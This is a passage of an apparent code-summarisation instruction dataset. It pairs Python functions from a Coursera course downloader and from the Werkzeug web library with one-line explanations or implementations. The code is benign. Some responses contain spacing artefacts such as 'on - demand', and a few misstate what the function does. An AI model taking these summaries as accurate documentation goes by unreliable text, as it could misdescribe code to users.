01_slides-presented-in-this-module_LM-3dtexton.pdf\n            supplement_links[extension].append((link, basename))\n\n        return supplement_links", "response": "Extract supplement links from the html text that contains a tags with href attribute."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef create_m3u_playlist(section_dir):\n    path_to_return = os.getcwd()\n\n    for (_path, subdirs, files) in os.walk(section_dir):\n        os.chdir(_path)\n        globbed_videos = sorted(glob.glob(\"*.mp4\"))\n        m3u_name = os.path.split(_path)[1] + \".m3u\"\n\n        if len(globbed_videos):\n            with open(m3u_name, \"w\") as m3u:\n                for video in globbed_videos:\n                    m3u.write(video + \"\\n\")\n            os.chdir(path_to_return)\n    os.chdir(path_to_return)", "response": "Create M3U playlist with contents of section_dir. mp4 files."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef list_courses(self):\n        course = CourseraOnDemand(session=self._session,\n                                  course_id=None,\n                                  course_name=None)\n        return course.list_courses()", "response": "List enrolled courses.\n\n        @return: List of enrolled courses.\n        @rtype: [str]"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef _get_on_demand_syllabus(self, class_name):\n\n        url = OPENCOURSE_ONDEMAND_COURSE_MATERIALS_V2.format(\n            class_name=class_name)\n        page = get_page(self._session, url)\n        logging.debug('Downloaded %s (%d bytes)', url, len(page))\n\n        return page", "response": "Get the on - demand course listing webpage."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef _parse_on_demand_syllabus(self, course_name, page, reverse=False,\n                                  unrestricted_filenames=False,\n                                  subtitle_language='en',\n                                  video_resolution=None,\n                                  download_quizzes=False,\n                                  mathjax_cdn_url=None,\n                                  download_notebooks=False\n                                  ):\n        \"\"\"\n        Parse a Coursera on-demand course listing/syllabus page.\n\n        @return: Tuple of (bool, list), where bool indicates whether\n            there was at least on error while parsing syllabus, the list\n            is a list of parsed modules.\n        @rtype: (bool, list)\n        \"\"\"\n\n        dom = json.loads(page)\n        class_id = dom['elements'][0]['id']\n\n        logging.info('Parsing syllabus of on-demand course (id=%s). '\n                     'This may take some time, please be patient ...',\n                     class_id)\n        modules = []\n\n        json_modules = dom['linked']['onDemandCourseMaterialItems.v2']\n        course = CourseraOnDemand(\n            session=self._session, course_id=class_id,\n            course_name=course_name,\n            unrestricted_filenames=unrestricted_filenames,\n            mathjax_cdn_url=mathjax_cdn_url)\n        course.obtain_user_id()\n        ondemand_material_items = OnDemandCourseMaterialItemsV1.create(\n            session=self._session, course_name=course_name)\n\n        if is_debug_run():\n            spit_json(dom, '%s-syllabus-raw.json' % course_name)\n            spit_json(json_modules, '%s-material-items-v2.json' % course_name)\n            spit_json(ondemand_material_items._items,\n                      '%s-course-material-items.json' % course_name)\n\n        error_occurred = False\n\n        all_modules = ModulesV1.from_json(\n            dom['linked']['onDemandCourseMaterialModules.v1'])\n        all_lessons = LessonsV1.from_json(\n            dom['linked']['onDemandCourseMaterialLessons.v1'])\n        all_items = ItemsV2.from_json(\n            dom['linked']['onDemandCourseMaterialItems.v2'])\n\n        for module in all_modules:\n            logging.info('Processing module  %s', module.slug)\n            lessons = []\n            for section in module.children(all_lessons):\n                logging.info('Processing section     %s', section.slug)\n                lectures = []\n                available_lectures = section.children(all_items)\n\n                # Certain modules may be empty-looking programming assignments\n                # e.g. in data-structures, algorithms-on-graphs ondemand\n                # courses\n                if not available_lectures:\n                    lecture = ondemand_material_items.get(section.id)\n                    if lecture is not None:\n                        available_lectures = [lecture]\n\n                for lecture in available_lectures:\n                    typename = lecture.type_name\n\n                    logging.info('Processing lecture         %s (%s)',\n                                 lecture.slug, typename)\n                    # Empty dictionary means there were no data\n                    # None means an error occurred\n                    links = {}\n\n                    if typename == 'lecture':\n                        # lecture_video_id = lecture['content']['definition']['videoId']\n                        # assets = lecture['content']['definition'].get(\n                        #     'assets', [])\n                        lecture_video_id = lecture.id\n                        # assets = []\n\n                        links = course.extract_links_from_lecture(\n                            class_id,\n                            lecture_video_id, subtitle_language,\n                            video_resolution)\n\n                    elif typename == 'supplement':\n                        links = course.extract_links_from_supplement(\n                            lecture.id)\n\n                    elif typename == 'phasedPeer':\n                        links = course.extract_links_from_peer_assignment(\n                            lecture.id)\n\n                    elif typename in ('gradedProgramming', 'ungradedProgramming'):\n                        links = course.extract_links_from_programming(\n                            lecture.id)\n\n                    elif typename == 'quiz':\n                        if download_quizzes:\n                            links = course.extract_links_from_quiz(\n                                lecture.id)\n\n                    elif typename == 'exam':\n                        if download_quizzes:\n                            links = course.extract_links_from_exam(\n                                lecture.id)\n\n                    elif typename == 'programming':\n                        if download_quizzes:\n                            links = course.extract_links_from_programming_immediate_instructions(\n                                lecture.id)\n\n                    elif typename == 'notebook':\n                        if download_notebooks and not self._notebook_downloaded:\n                            logging.warning(\n                                'According to notebooks platform, content will be downloaded first')\n                            links = course.extract_links_from_notebook(\n                                lecture.id)\n                            self._notebook_downloaded = True\n\n                    else:\n                        logging.info(\n                            'Unsupported typename \"%s\" in lecture \"%s\" (lecture id \"%s\")',\n                            typename, lecture.slug, lecture.id)\n                        continue\n\n                    if links is None:\n                        error_occurred = True\n                    elif links:\n                        lectures.append((lecture.slug, links))\n\n                if lectures:\n                    lessons.append((section.slug, lectures))\n\n            if lessons:\n                modules.append((module.slug, lessons))\n\n        if modules and reverse:\n            modules.reverse()\n\n        # Processing resources section\n        json_references = course.extract_references_poll()\n        references = []\n        if json_references:\n            logging.info('Processing resources')\n            for json_reference in json_references:\n                reference = []\n                reference_slug = json_reference['slug']\n                logging.info('Processing resource  %s',\n                             reference_slug)\n\n                links = course.extract_links_from_reference(\n                    json_reference['shortId'])\n                if links is None:\n                    error_occurred = True\n                elif links:\n                    reference.append(('', links))\n\n                if reference:\n                    references.append((reference_slug, reference))\n\n        if references:\n            modules.append((\"Resources\", references))\n\n        return error_occurred, modules", "response": "Parse a Coursera on - demand course listing page."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef _walk_modules(modules, class_name, path, ignored_formats, args):\n    for module in _iter_modules(modules=modules,\n                                class_name=class_name,\n                                path=path,\n                                ignored_formats=ignored_formats,\n                                args=args):\n        for section in module.sections:\n            for lecture in section.lectures:\n                for resource in lecture.resources:\n                    yield module, section, lecture, resource", "response": "Helper generator that traverses modules in returns a flattened\n    iterator."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef _handle_resource(self, url, fmt, lecture_filename, callback, last_update):\n        overwrite = self._args.overwrite\n        resume = self._args.resume\n        skip_download = self._args.skip_download\n\n        # Decide whether we need to download it\n        if overwrite or not os.path.exists(lecture_filename) or resume:\n            if not skip_download:\n                if url.startswith(IN_MEMORY_MARKER):\n                    page_content = url[len(IN_MEMORY_MARKER):]\n                    logging.info('Saving page contents to: %s', lecture_filename)\n                    with codecs.open(lecture_filename, 'w', 'utf-8') as file_object:\n                        file_object.write(page_content)\n                else:\n                    if self.skipped_urls is not None and skip_format_url(fmt, url):\n                        self.skipped_urls.append(url)\n                    else:\n                        logging.info('Downloading: %s', lecture_filename)\n                        self._downloader.download(callback, url, lecture_filename, resume=resume)\n            else:\n                open(lecture_filename, 'w').close()  # touch\n            last_update = time.time()\n        else:\n            logging.info('%s already downloaded', lecture_filename)\n            # if this file hasn't been modified in a long time,\n            # record that time\n            last_update = max(last_update,\n                              os.path.getmtime(lecture_filename))\n        return last_update", "response": "Handle a resource. This function downloads the resource if necessary and updates the last_update timestamp."}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nprepares a destination lecture filename.", "response": "def get_lecture_filename(combined_section_lectures_nums,\n                         section_dir,\n                         secnum,\n                         lecnum,\n                         lecname,\n                         title,\n                         fmt):\n    \"\"\"\n    Prepare a destination lecture filename.\n\n    @param combined_section_lectures_nums: Flag that indicates whether\n        section lectures should have combined numbering.\n    @type combined_section_lectures_nums: bool\n\n    @param section_dir: Path to current section directory.\n    @type section_dir: str\n\n    @param secnum: Section number.\n    @type secnum: int\n\n    @param lecnum: Lecture number.\n    @type lecnum: int\n\n    @param lecname: Lecture name.\n    @type lecname: str\n\n    @param title: Resource title.\n    @type title: str\n\n    @param fmt: Format of the resource (pdf, csv, etc)\n    @type fmt: str\n\n    @return: Lecture file name.\n    @rtype: str\n    \"\"\"\n    # FIXME: this is a quick and dirty solution to Filename too long\n    # problem. We need to think of a more general way to solve this\n    # issue.\n    fmt = fmt[:FORMAT_MAX_LENGTH]\n    title = title[:TITLE_MAX_LENGTH]\n\n    # Format lecture file name\n    if combined_section_lectures_nums:\n        lecture_filename = os.path.join(\n            section_dir,\n            format_combine_number_resource(\n                secnum + 1, lecnum + 1, lecname, title, fmt))\n    else:\n        lecture_filename = os.path.join(\n            section_dir, format_resource(lecnum + 1, lecname, title, fmt))\n\n    return lecture_filename"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef format_bytes(bytes):\n    if bytes is None:\n        return 'N/A'\n    if type(bytes) is str:\n        bytes = float(bytes)\n    if bytes == 0.0:\n        exponent = 0\n    else:\n        exponent = int(math.log(bytes, 1024.0))\n    suffix = ['B', 'KB', 'MB', 'GB', 'TB', 'PB', 'EB', 'ZB', 'YB'][exponent]\n    converted = float(bytes) / float(1024 ** exponent)\n    return '{0:.2f}{1}'.format(converted, suffix)", "response": "Returns a human readable version of given bytes."}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nreturn a downloader for the specified class.", "response": "def get_downloader(session, class_name, args):\n    \"\"\"\n    Decides which downloader to use.\n    \"\"\"\n\n    external = {\n        'wget': WgetDownloader,\n        'curl': CurlDownloader,\n        'aria2': Aria2Downloader,\n        'axel': AxelDownloader,\n    }\n\n    for bin, class_ in iteritems(external):\n        if getattr(args, bin):\n            return class_(session, bin=getattr(args, bin),\n                          downloader_arguments=args.downloader_arguments)\n\n    return NativeDownloader(session)"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\ndownloads the given url to the given file.", "response": "def download(self, url, filename, resume=False):\n        \"\"\"\n        Download the given url to the given file. When the download\n        is aborted by the user, the partially downloaded file is also removed.\n        \"\"\"\n\n        try:\n            self._start_download(url, filename, resume)\n        except KeyboardInterrupt as e:\n            # keep the file if resume is True\n            if not resume:\n                logging.info('Keyboard Interrupt -- Removing partial file: %s',\n                             filename)\n                try:\n                    os.remove(filename)\n                except OSError:\n                    pass\n            raise e"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nextract cookies from the requests session and add them to the command", "response": "def _prepare_cookies(self, command, url):\n        \"\"\"\n        Extract cookies from the requests session and add them to the command\n        \"\"\"\n\n        req = requests.models.Request()\n        req.method = 'GET'\n        req.url = url\n\n        cookie_values = requests.cookies.get_cookie_header(\n            self.session.cookies, req)\n\n        if cookie_values:\n            self._add_cookies(command, cookie_values)"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nwrapping for the download method.", "response": "def _download_wrapper(self, url, *args, **kwargs):\n        \"\"\"\n        Actual download call. Calls the underlying file downloader,\n        catches all exceptions and returns the result.\n        \"\"\"\n        try:\n            return url, self._file_downloader.download(url, *args, **kwargs)\n        except Exception as e:\n            logging.error(\"AbstractDownloader: %s\", traceback.format_exc())\n            return url, e"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef get_config_paths(config_name):  # pragma: no test\n\n    if platform.system() != 'Windows':\n        return [None]\n\n    # Now, we only treat the case of Windows\n    env_vars = [[\"HOME\"],\n                [\"HOMEDRIVE\", \"HOMEPATH\"],\n                [\"USERPROFILE\"],\n                [\"SYSTEMDRIVE\"]]\n\n    env_dirs = []\n    for var_list in env_vars:\n\n        var_values = [_getenv_or_empty(var) for var in var_list]\n\n        directory = ''.join(var_values)\n        if not directory:\n            logging.debug('Environment var(s) %s not defined, skipping',\n                          var_list)\n        else:\n            env_dirs.append(directory)\n\n    additional_dirs = [\"C:\", \"\"]\n\n    all_dirs = env_dirs + additional_dirs\n\n    leading_chars = [\".\", \"_\"]\n\n    res = [''.join([directory, os.sep, lc, config_name])\n           for directory in all_dirs\n           for lc in leading_chars]\n\n    return res", "response": "Returns a list of config file paths to try in order given a config file name and possibly a user - specified path."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nauthenticating through the netrc file and return the user and password.", "response": "def authenticate_through_netrc(path=None):\n    \"\"\"\n    Return the tuple user / password given a path for the .netrc file.\n\n    Raises CredentialsError if no valid netrc file is found.\n    \"\"\"\n    errors = []\n    netrc_machine = 'coursera-dl'\n    paths = [path] if path else get_config_paths(\"netrc\")\n    for path in paths:\n        try:\n            logging.debug('Trying netrc file %s', path)\n            auths = netrc.netrc(path).authenticators(netrc_machine)\n        except (IOError, netrc.NetrcParseError) as e:\n            errors.append(e)\n        else:\n            if auths is None:\n                errors.append('Didn\\'t find any credentials for ' +\n                              netrc_machine)\n            else:\n                return auths[0], auths[2]\n\n    error_messages = '\\n'.join(str(e) for e in errors)\n    raise CredentialsError(\n        'Did not find valid netrc file:\\n' + error_messages +\n        '\\nPlease run this command: chmod og-rw ~/.netrc')"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nget username and password tuple.", "response": "def get_credentials(username=None, password=None, netrc=None, use_keyring=False):\n    \"\"\"\n    Return valid username, password tuple.\n\n    Raises CredentialsError if username or password is missing.\n    \"\"\"\n    if netrc:\n        path = None if netrc is True else netrc\n        return authenticate_through_netrc(path)\n\n    if not username:\n        raise CredentialsError(\n            'Please provide a username with the -u option, '\n            'or a .netrc file with the -n option.')\n\n    if not password and use_keyring:\n        password = keyring.get_password(KEYRING_SERVICE_NAME, username)\n\n    if not password:\n        password = getpass.getpass('Coursera password for {0}: '.format(username))\n        if use_keyring:\n            keyring.set_password(KEYRING_SERVICE_NAME, username, password)\n\n    return username, password"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef page_index(request):\n    letters = {}\n    for page in Page.query.order_by(Page.name):\n        letters.setdefault(page.name.capitalize()[0], []).append(page)\n    return Response(\n        generate_template(\"page_index.html\", letters=sorted(letters.items()))\n    )", "response": "Index of all pages."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\ndisplay the recent changes.", "response": "def recent_changes(request):\n    \"\"\"Display the recent changes.\"\"\"\n    page = max(1, request.args.get(\"page\", type=int))\n    query = RevisionedPage.query.order_by(RevisionedPage.revision_id.desc())\n    return Response(\n        generate_template(\n            \"recent_changes.html\",\n            pagination=Pagination(query, 20, page, \"Special:Recent_Changes\"),\n        )\n    )"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nstarts a new development server.", "response": "def runserver(hostname, port, no_reloader, debugger, no_evalex, threaded, processes):\n    \"\"\"Start a new development server.\"\"\"\n    app = make_app()\n    reloader = not no_reloader\n    evalex = not no_evalex\n    run_simple(\n        hostname,\n        port,\n        app,\n        use_reloader=reloader,\n        use_debugger=debugger,\n        use_evalex=evalex,\n        threaded=threaded,\n        processes=processes,\n    )"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef iter_multi_items(mapping):\n    if isinstance(mapping, MultiDict):\n        for item in iteritems(mapping, multi=True):\n            yield item\n    elif isinstance(mapping, dict):\n        for key, value in iteritems(mapping):\n            if isinstance(value, (tuple, list)):\n                for value in value:\n                    yield key, value\n            else:\n                yield key, value\n    else:\n        for item in mapping:\n            yield item", "response": "Iterates over the items of a mapping yielding keys and values\n    without dropping any from more complex structures."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef get(self, key, default=None, type=None):\n        try:\n            rv = self[key]\n        except KeyError:\n            return default\n        if type is not None:\n            try:\n                rv = type(rv)\n            except ValueError:\n                rv = default\n        return rv", "response": "Get the value of the requested key from the dict."}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nusing internally by the accessor properties.", "response": "def _get_cache_value(self, key, empty, type):\n        \"\"\"Used internally by the accessor properties.\"\"\"\n        if type is bool:\n            return key in self\n        if key in self:\n            value = self[key]\n            if value is None:\n                return empty\n            elif type is not None:\n                try:\n                    value = type(value)\n                except ValueError:\n                    pass\n            return value"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nusing internally by the accessor properties.", "response": "def _set_cache_value(self, key, value, type):\n        \"\"\"Used internally by the accessor properties.\"\"\"\n        if type is bool:\n            if value:\n                self[key] = None\n            else:\n                self.pop(key, None)\n        else:\n            if value is None:\n                self.pop(key)\n            elif value is True:\n                self[key] = None\n            else:\n                self[key] = value"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef remove(self, header):\n        key = header.lower()\n        if key not in self._set:\n            raise KeyError(header)\n        self._set.remove(key)\n        for idx, key in enumerate(self._headers):\n            if key.lower() == header:\n                del self._headers[idx]\n                break\n        if self.on_update is not None:\n            self.on_update(self)", "response": "Removes a header from the set."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef update(self, iterable):\n        inserted_any = False\n        for header in iterable:\n            key = header.lower()\n            if key not in self._set:\n                self._headers.append(header)\n                self._set.add(key)\n                inserted_any = True\n        if inserted_any and self.on_update is not None:\n            self.on_update(self)", "response": "Adds all the headers from the iterable to the set."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nreturn the index of the header in the set or - 1 if not found.", "response": "def find(self, header):\n        \"\"\"Return the index of the header in the set or return -1 if not found.\n\n        :param header: the header to be looked up.\n        \"\"\"\n        header = header.lower()\n        for idx, item in enumerate(self._headers):\n            if item.lower() == header:\n                return idx\n        return -1"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nreturn the index of the header in the set or raise an exception.", "response": "def index(self, header):\n        \"\"\"Return the index of the header in the set or raise an\n        :exc:`IndexError`.\n\n        :param header: the header to be looked up.\n        \"\"\"\n        rv = self.find(header)\n        if rv < 0:\n            raise IndexError(header)\n        return rv"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nreturn the set as real python set type.", "response": "def as_set(self, preserve_casing=False):\n        \"\"\"Return the set as real python set type.  When calling this, all\n        the items are converted to lowercase and the ordering is lost.\n\n        :param preserve_casing: if set to `True` the items in the set returned\n                                will have the original case like in the\n                                :class:`HeaderSet`, otherwise they will\n                                be lowercase.\n        \"\"\"\n        if preserve_casing:\n            return set(self._headers)\n        return set(self._set)"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nconverts the ETags object into a python set.", "response": "def as_set(self, include_weak=False):\n        \"\"\"Convert the `ETags` object into a python set.  Per default all the\n        weak etags are not part of this set.\"\"\"\n        rv = set(self._strong)\n        if include_weak:\n            rv.update(self._weak)\n        return rv"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nreturns True if the tag is in the set False otherwise.", "response": "def contains_raw(self, etag):\n        \"\"\"When passed a quoted tag it will check if this tag is part of the\n        set.  If the tag is weak it is checked against weak and strong tags,\n        otherwise strong only.\"\"\"\n        etag, weak = unquote_etag(etag)\n        if weak:\n            return self.contains_weak(etag)\n        return self.contains(etag)"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nconverts the etags set into a HTTP header string.", "response": "def to_header(self):\n        \"\"\"Convert the etags set into a HTTP header string.\"\"\"\n        if self.star_tag:\n            return \"*\"\n        return \", \".join(\n            ['\"%s\"' % x for x in self._strong] + ['W/\"%s\"' % x for x in self._weak]\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef to_header(self):\n        if self.date is not None:\n            return http_date(self.date)\n        if self.etag is not None:\n            return quote_etag(self.etag)\n        return \"\"", "response": "Converts the object back into an HTTP header."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef range_for_length(self, length):\n        if self.units != \"bytes\" or length is None or len(self.ranges) != 1:\n            return None\n        start, end = self.ranges[0]\n        if end is None:\n            end = length\n            if start < 0:\n                start += length\n        if is_byte_range_valid(start, end, length):\n            return start, min(end, length)", "response": "Returns a tuple of start stop that is satisfiable for the given length."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef make_content_range(self, length):\n        rng = self.range_for_length(length)\n        if rng is not None:\n            return ContentRange(self.units, rng[0], rng[1], length)", "response": "Creates a : class : ~werkzeug. datastructures. ContentRange object from the current range and given content length."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nconverting the object back into an HTTP header.", "response": "def to_header(self):\n        \"\"\"Converts the object back into an HTTP header.\"\"\"\n        ranges = []\n        for begin, end in self.ranges:\n            if end is None:\n                ranges.append(\"%s-\" % begin if begin >= 0 else str(begin))\n            else:\n                ranges.append(\"%s-%s\" % (begin, end - 1))\n        return \"%s=%s\" % (self.units, \",\".join(ranges))"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nconvert the object into a Content - Range HTTP header based on given length.", "response": "def to_content_range_header(self, length):\n        \"\"\"Converts the object into `Content-Range` HTTP header,\n        based on given length\n        \"\"\"\n        range_for_length = self.range_for_length(length)\n        if range_for_length is not None:\n            return \"%s %d-%d/%d\" % (\n                self.units,\n                range_for_length[0],\n                range_for_length[1] - 1,\n                length,\n            )\n        return None"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nset the auth info and enable digest auth.", "response": "def set_digest(\n        self, realm, nonce, qop=(\"auth\",), opaque=None, algorithm=None, stale=False\n    ):\n        \"\"\"Clear the auth info and enable digest auth.\"\"\"\n        d = {\n            \"__auth_type__\": \"digest\",\n            \"realm\": realm,\n            \"nonce\": nonce,\n            \"qop\": dump_header(qop),\n        }\n        if stale:\n            d[\"stale\"] = \"TRUE\"\n        if opaque is not None:\n            d[\"opaque\"] = opaque\n        if algorithm is not None:\n            d[\"algorithm\"] = algorithm\n        dict.clear(self)\n        dict.update(self, d)\n        if self.on_update:\n            self.on_update(self)"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nconvert the stored values into a WWW - Authenticate header.", "response": "def to_header(self):\n        \"\"\"Convert the stored values into a WWW-Authenticate header.\"\"\"\n        d = dict(self)\n        auth_type = d.pop(\"__auth_type__\", None) or \"basic\"\n        return \"%s %s\" % (\n            auth_type.title(),\n            \", \".join(\n                [\n                    \"%s=%s\"\n                    % (\n                        key,\n                        quote_header_value(\n                            value, allow_token=key not in self._require_quoting\n                        ),\n                    )\n                    for key, value in iteritems(d)\n                ]\n            ),\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef auth_property(name, doc=None):  # noqa: B902\n\n        def _set_value(self, value):\n            if value is None:\n                self.pop(name, None)\n            else:\n                self[name] = str(value)\n\n        return property(lambda x: x.get(name), _set_value, doc=doc)", "response": "A property that provides a static helper function for subclasses to add extra authentication\n            system properties onto a class."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef save(self, dst, buffer_size=16384):\n        from shutil import copyfileobj\n\n        close_dst = False\n        if isinstance(dst, string_types):\n            dst = open(dst, \"wb\")\n            close_dst = True\n        try:\n            copyfileobj(self.stream, dst, buffer_size)\n        finally:\n            if close_dst:\n                dst.close()", "response": "Save the file to a destination path or file object."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef force_type(cls, response, environ=None):\n        if not isinstance(response, BaseResponse):\n            if environ is None:\n                raise TypeError(\n                    \"cannot convert WSGI application into response\"\n                    \" objects without an environ\"\n                )\n            response = BaseResponse(*_run_wsgi_app(response, environ))\n        response.__class__ = cls\n        return response", "response": "Enforces that the WSGI response is a response object of the current one."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef from_app(cls, app, environ, buffered=False):\n        return cls(*_run_wsgi_app(app, environ, buffered))", "response": "Create a new response object from an application output."}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nreturns the content length if available or None otherwise.", "response": "def calculate_content_length(self):\n        \"\"\"Returns the content length if available or `None` otherwise.\"\"\"\n        try:\n            self._ensure_sequence()\n        except RuntimeError:\n            return None\n        return sum(len(x) for x in self.iter_encoded())"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef make_sequence(self):\n        if not self.is_sequence:\n            # if we consume an iterable we have to ensure that the close\n            # method of the iterable is called if available when we tear\n            # down the response\n            close = getattr(self.response, \"close\", None)\n            self.response = list(self.iter_encoded())\n            if close is not None:\n                self.call_on_close(close)", "response": "Converts the response iterator in a list."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef set_cookie(\n        self,\n        key,\n        value=\"\",\n        max_age=None,\n        expires=None,\n        path=\"/\",\n        domain=None,\n        secure=False,\n        httponly=False,\n        samesite=None,\n    ):\n        \"\"\"Sets a cookie. The parameters are the same as in the cookie `Morsel`\n        object in the Python standard library but it accepts unicode data, too.\n\n        A warning is raised if the size of the cookie header exceeds\n        :attr:`max_cookie_size`, but the header will still be set.\n\n        :param key: the key (name) of the cookie to be set.\n        :param value: the value of the cookie.\n        :param max_age: should be a number of seconds, or `None` (default) if\n                        the cookie should last only as long as the client's\n                        browser session.\n        :param expires: should be a `datetime` object or UNIX timestamp.\n        :param path: limits the cookie to a given path, per default it will\n                     span the whole domain.\n        :param domain: if you want to set a cross-domain cookie.  For example,\n                       ``domain=\".example.com\"`` will set a cookie that is\n                       readable by the domain ``www.example.com``,\n                       ``foo.example.com`` etc.  Otherwise, a cookie will only\n                       be readable by the domain that set it.\n        :param secure: If `True`, the cookie will only be available via HTTPS\n        :param httponly: disallow JavaScript to access the cookie.  This is an\n                         extension to the cookie standard and probably not\n                         supported by all browsers.\n        :param samesite: Limits the scope of the cookie such that it will only\n                         be attached to requests if those requests are\n                         \"same-site\".\n        \"\"\"\n        self.headers.add(\n            \"Set-Cookie\",\n            dump_cookie(\n                key,\n                value=value,\n                max_age=max_age,\n                expires=expires,\n                path=path,\n                domain=domain,\n                secure=secure,\n                httponly=httponly,\n                charset=self.charset,\n                max_size=self.max_cookie_size,\n                samesite=samesite,\n            ),\n        )", "response": "Sets a cookie for the given key value pair."}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\ncloses the wrapped response if possible.", "response": "def close(self):\n        \"\"\"Close the wrapped response if possible.  You can also use the object\n        in a with statement which will automatically close it.\n\n        .. versionadded:: 0.9\n           Can now be used in a with statement.\n        \"\"\"\n        if hasattr(self.response, \"close\"):\n            self.response.close()\n        for func in self._on_close:\n            func()"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef get_wsgi_headers(self, environ):\n        headers = Headers(self.headers)\n        location = None\n        content_location = None\n        content_length = None\n        status = self.status_code\n\n        # iterate over the headers to find all values in one go.  Because\n        # get_wsgi_headers is used each response that gives us a tiny\n        # speedup.\n        for key, value in headers:\n            ikey = key.lower()\n            if ikey == u\"location\":\n                location = value\n            elif ikey == u\"content-location\":\n                content_location = value\n            elif ikey == u\"content-length\":\n                content_length = value\n\n        # make sure the location header is an absolute URL\n        if location is not None:\n            old_location = location\n            if isinstance(location, text_type):\n                # Safe conversion is necessary here as we might redirect\n                # to a broken URI scheme (for instance itms-services).\n                location = iri_to_uri(location, safe_conversion=True)\n\n            if self.autocorrect_location_header:\n                current_url = get_current_url(environ, strip_querystring=True)\n                if isinstance(current_url, text_type):\n                    current_url = iri_to_uri(current_url)\n                location = url_join(current_url, location)\n            if location != old_location:\n                headers[\"Location\"] = location\n\n        # make sure the content location is a URL\n        if content_location is not None and isinstance(content_location, text_type):\n            headers[\"Content-Location\"] = iri_to_uri(content_location)\n\n        if 100 <= status < 200 or status == 204:\n            # Per section 3.3.2 of RFC 7230, \"a server MUST NOT send a\n            # Content-Length header field in any response with a status\n            # code of 1xx (Informational) or 204 (No Content).\"\n            headers.remove(\"Content-Length\")\n        elif status == 304:\n            remove_entity_headers(headers)\n\n        # if we can determine the content length automatically, we\n        # should try to do that.  But only if this does not involve\n        # flattening the iterator or encoding of unicode strings in\n        # the response.  We however should not do that if we have a 304\n        # response.\n        if (\n            self.automatically_set_content_length\n            and self.is_sequence\n            and content_length is None\n            and status not in (204, 304)\n            and not (100 <= status < 200)\n        ):\n            try:\n                content_length = sum(len(to_bytes(x, \"ascii\")) for x in self.response)\n            except UnicodeError:\n                # aha, something non-bytestringy in there, too bad, we\n                # can't safely figure out the length of the response.\n                pass\n            else:\n                headers[\"Content-Length\"] = str(content_length)\n\n        return headers", "response": "This function returns the WSGI headers modified for the given environment."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef get_wsgi_response(self, environ):\n        headers = self.get_wsgi_headers(environ)\n        app_iter = self.get_app_iter(environ)\n        return app_iter, self.status, headers.to_wsgi_list()", "response": "Returns the WSGI response as tuple."}
